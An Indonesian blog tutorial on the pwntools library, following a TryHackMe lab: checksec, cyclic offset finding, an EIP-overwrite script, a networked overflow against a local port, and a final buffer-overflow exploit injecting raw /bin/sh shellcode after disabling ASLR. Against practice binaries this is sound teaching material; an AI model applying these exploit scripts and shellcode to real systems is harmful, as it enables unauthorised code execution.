---
title: 'Intro to Pwntools'
date: 2022-12-31 03:40:22 +0700
categories: ['Binary Exploitation', 'Linux-Exploit']
tags: [assembly, buffer overflows, stack-buffer overflows, x86, binexp-linux, pwntools]     # TAG names should always be lowercase
author: nairpaa
---

Ketika kita mempelajari *binary exploitation* dan CTF, kita akan menemukan bahwa banyak para pemain CTF menggunakan `pwntools`. 

[`pwntools`](https://github.com/Gallopsled/pwntools) adalah CTF framework dan *exploit development library* yang ditulis menggunakan Python untuk mempermudah pengguna membuat *script* eksploitasi.

Saya menemukan tempat yang bagus untuk mempelajari dasar `pwntools` ini pada [TryHackMe](https://tryhackme.com/room/introtopwntools). 

## 1. Persiapan

Instalasi `pwntools` dapat menggunakan `pip` seperti berikut:

```bash
➜ apt-get update
➜ apt-get install python3 python3-pip python3-dev git libssl-dev libffi-dev build-essential
➜ python3 -m pip install --upgrade pip
➜ python3 -m pip install --upgrade pwntools
```

Untuk latihan kali ini kita bisa gunakan Lab yang ada di TryHackMe atau men-download secara [lokal](https://github.com/dizmascyberlabs/IntroToPwntools).

Pada repositori tersebut terdapat terdapat beberapa direktori yang akan kita gunakan, yaitu: `checksec`, `cyclic`, `networking`, dan `shellcraft`.

## 2. Checksec 

Pada direktori `checksec` terdapat kode C dan dua file *executables* dari kode tersebut. Hanya saja salah satunya memiliki pengamanan. 

`checksec` digunakan untuk memeriksa apakah suatu binary memiliki pengamanan atau tidak. Untuk menggunakan `checksec`, kita bisa menggunakan perintah berikut:

```bash
➜ checksec <binary>

➜ checksec intro2pwn1
[*] '/IntroToPwntools/checksec/intro2pwn1'
    Arch:     i386-32-little
    RELRO:    Full RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled

➜ checksec intro2pwn2
[*] '/IntroToPwntools/checksec/intro2pwn2'
    Arch:     i386-32-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX disabled
    PIE:      No PIE (0x8048000)
    RWX:      Has RWX segments
```

Hasil dari perintah tersebut akan menampilkan informasi **Arch**, **RELRO**, **Stack**, **NX**, **PIE**, dan **RWX** dari binary yang dituju.

Keterangan:
- [**RELRO (Relocation Read-Only)**](https://www.redhat.com/en/blog/hardening-elf-binaries-using-relocation-read-only-relro): yang membuat *global offset table* (GOT) menjadi *read-only* setelah *linker* menyelesaikan fungsinya. GOT penting untuk penanganan seperti teknik serangan `ret-to-libc`.
- [**Stack canaries**](https://www.sans.org/blog/stack-canaries-gingerly-sidestepping-the-cage/): adalah token yang ditempatkan setelah Stack untuk mendeteksi stack overflow. Ketika terjadi stack overflow, token ini akan menjadi rusak. Hasilnya, program akan dimatikan.
- [**NX**](https://en.wikipedia.org/wiki/Executable_space_protection): adalah kependekan dari *non-executable*. Jika ini diaktifkan, maka segmen memori dapat ditulis atau dieksekusi (hanya salah satu dalam satu waktu). Hal ini menghentikan potensi penyerang untuk menyisipkan *shellcode* ke dalam program, karena di segmen yang dapat ditulis tidak bisa dieksekusi. Pada binary yang rentan, kita mungkin dapat menemukan baris tambahan **RWX** yang menunjukkan bahwa ada segmen yang dapat dibaca, ditulis dan diekseksui.
- [**PIE (Position Independent Executable)**](https://access.redhat.com/blogs/766093/posts/1975793): yaitu memuat dependensi program ke lokasi acak, sehingga serangan yang mengandalkan tata letak memori lebih sulit dilakukan.

> Informasi lebih tentang penggunaan `checksec` dapat Anda temui pada [artikel ini](https://blog.siphos.be/2011/07/high-level-explanation-on-some-binary-executable-security/).
{: .prompt-tip }


## 3. Cyclic

Sekarang kita lanjut ke direktori `cyclic`. Bisa kita lihat pada file `test_cyclic.c`, alur normal program hanya akan memanggil fungsi `start()`, sementara fungsi `print_flag()` tidak dipanggil.

Jika kita perhatikan, pada fungsi `start()` terdapat fungsi yang rentan terhadap buffer overflow, yaitu fungsi `get()` (Anda bisa membaca lebih dalam tentang ini [di sini](https://faq.cprogramming.com/cgi-bin/smartfaq.cgi?answer=1049157810&id=1043284351)).

Pada kasus ini, variabel `name` hanya dialokasikan sebesar 24 byte. Jika kita memasukkannya lebih dari 24 byte, kita dapat menimpa bagian lain pada memori.

Seperti yang dijelaskan pada [latihan buffer overflows](/posts/stack-buffer-overflows-linux/) sebelumnya, kita akan mencoba untuk mengontrol `EIP` (atau `RIP`). Setelah itu kita akan membuat program untuk mengeksekusi fungsi `print_flag()`.

### Penggunaan Cyclic

Pertama *debug* terlebih dahulu program `intro2pwn3`, lalu berikan input-an dengan data yang ada pada file `alphabet`.
```bash
➜ gdb intro2pwn3
gef> r < alphabet
gef> info register $eip
 eip            0x4a4a4a4a          0x4a4a4a4a
```

Terlihat pada hasil di atas, nilai `EIP` tertimpa hingga memiliki nilai `0x4a4a4a4a`.

Untuk dapat mengontrol `EIP` kita harus menemukan *offset*-nya terlebih dahulu. Biasanya kita menggunakan `msf-pattern_create`, tetapi pada `pwntools` terdapat alat lain, yaitu `cyclic`.

Untuk menggunakan `cyclic` kita dapat menggunakan perintah berikut:

```bash
➜ cyclic 100
➜ cyclic 100 > pattern
```

```bash
➜ gdb intro2pwn3
gef> r < pattern
gef> info register $eip
eip            0x6161616a          0x6161616a
```

Ketika kita men-*debug* ulang program, lalu memberikan input-an dengan *pattern* sebelumnya, kita akan menemukan bahwa nilai `EIP` akan menjadi `0x6161616a` atau `jaaa` dalam ASCII.

Selanjutnya, kita akan coba mengontrol nilai `EIP` dengan *script* berikut. 

```python
from pwn import *

padding = cyclic(cyclic_find('jaaa'))
eip = p32(0xdeadbeef)
payload = padding + eip 
print(payload)
```
{: file="pwn_cyclic.py" }

> *Script* tersebut dijalan menggunakan python2.
{: .prompt-info }

```bash
➜ python2 pwn_cyclic.py > control-eip
➜ gdb intro2pwn3
gef> r < control-eip
gef> info register $eip
eip            0xdeadbeef          0xdeadbeef
```

Terlihat pada hasil di atas, `EIP` berhasil terubah sesuai yang telah kita tetapkan sebelumnya.

Kita akan membuat program tersebut memanggil fungsi `print_flag()`. Untuk melakukan hal ini pertama kita harus mengetahui terlebih dahulu alamat memori yang digunakan oleh fungsi tersebut. 

Jalankan perintah berikut pada `gdb` untuk mengetahui alamat memori dari fungsi `print_flag()`:

```bash
gef>  print& print_flag
$1 = (<text variable, no debug info> *) 0x8048536 <print_flag>
```

Dari hasil perintah tersebut dapat diketahui bahwa `0x8048536` adalah alamat dari fungsi `print_flag()`. Setelah itu ubah `0xdeadbeef` pada *script* menjadi `0x8048536`, jalankan *script* tersebut dan fungsi `print_flag()` akan tereksekusi.

```bash
➜ gdb intro2pwn3
gef> r < test
fake{not a real flag}

➜ ./intro2pwn3 < test      
I run as dizmas.
Who are you?: Getting Flag:
fake{not a real flag}
```

## 4. Networking

Kita berpindah ke direktori `networking`. Di dalamnya, terdapat binary `serve_test` yang akan menjalankan port 1336 yang rentan terhadap buffer overflow.

```bash
➜ chmod +x server_test
➜ ./server_test
```

### Memahami program

Ketika kita berkoneksi menggunakan `netcat` terhadap port tersebut, server akan memberiksan respons "**Give me deadbeef:**" hingga koneksi terputus.

Jika kita perhatikan pada kode C di `test_networking.c`, aplikasi akan menerima input dari pengguna melalui protokol TCP pada port 1336. Input ini akan disimpan pada char array sebesar 32 byte (`MAX`). 

Agar menampilkan flag, kita akan membuat nilai `targets.printflag` menjadi `0xdeadbeef` melalui eksploitasi buffer overflow.

### Memulai eksploitasi

Untuk melakukan eksploitasi, kita bisa menggunakan *script* berikut:

```python
from pwn import *

connect = remote('127.0.0.1', 1336)
print(connect.recvn(18))
payload = "A"*32
payload += p32(0xdeadbeef)
connect.send(payload)
print(connect.recvn(34))
```
{: file="pwn_network.py" }

Ketika kita menjalankan *script* tersebut, terlihat bahwa flag tampil.

```bash
➜ python2 pwn_network.py
[+] Opening connection to 127.0.0.1 on port 1336: Done
Give me deadbeef: 
Thank you!
flag{*****************}
[*] Closed connection to 127.0.0.1 port 1336
```

## 5. Shellcraft

> Sebelum lanjut, pastikan ASLR telah dinonaktifkan:
> `echo 0 | tee /proc/sys/kernel/randomize_va_space`.
{: .prompt-warning }

### Memahami program

Jika kita perihatikan pada kode C di `test_shellcraft.c`, program `intro2pwnFinal` memiliki kerentanan buffer overflow pada fitur input-nya. Kali ini kita akan membuat eksploitasi yang membuat program tersebut menjalankan [*shellcode*](/posts/assembly-cheatsheet/#shellcoding) yang kita sisipkan.

### Memulai eksploitasi

Kita akan menggunakan *script* berikut untuk mengeksploitasi buffer overflow dengan menyisipkan *shellcode*.

```python
from pwn import *

proc = process('./intro2pwnFinal') # berinteraksi dengan binary
proc.recvline() # menerima data dari program

padding = cyclic(cyclic_find('taaa')) 
eip = p32(0xffffcf80+200) # nilai ESP + offset sebesar 200 (bisa berapa pun, trial and error)
nop_slide = "\x90"*1000
shellcode = "jhh\x2f\x2f\x2fsh\x2fbin\x89\xe3jph\x01\x01\x01\x01\x814\x24ri\x01,1\xc9Qj\x07Y\x01\xe1Qj\x08Y\x01\xe1Q\x89\xe11\xd2j\x0bX\xcd\x80" # shellcraft i386.linux.execve "/bin///sh" "['sh', '-p']" -f a 
payload = padding + eip + nop_slide + shellcode

proc.send(payload) # mengirimkan payload
proc.interactive() # berinteraksi dengan shell yang didapatkan
```

Eksploitasi berhasil dilakukan:

```bash
➜ python2 hehe.py 
[+] Starting local process './intro2pwnFinal': pid 130312
[*] Switching to interactive mode
$ whoami
kali
```

---
Referensi:
- https://tryhackme.com/room/introtopwntools
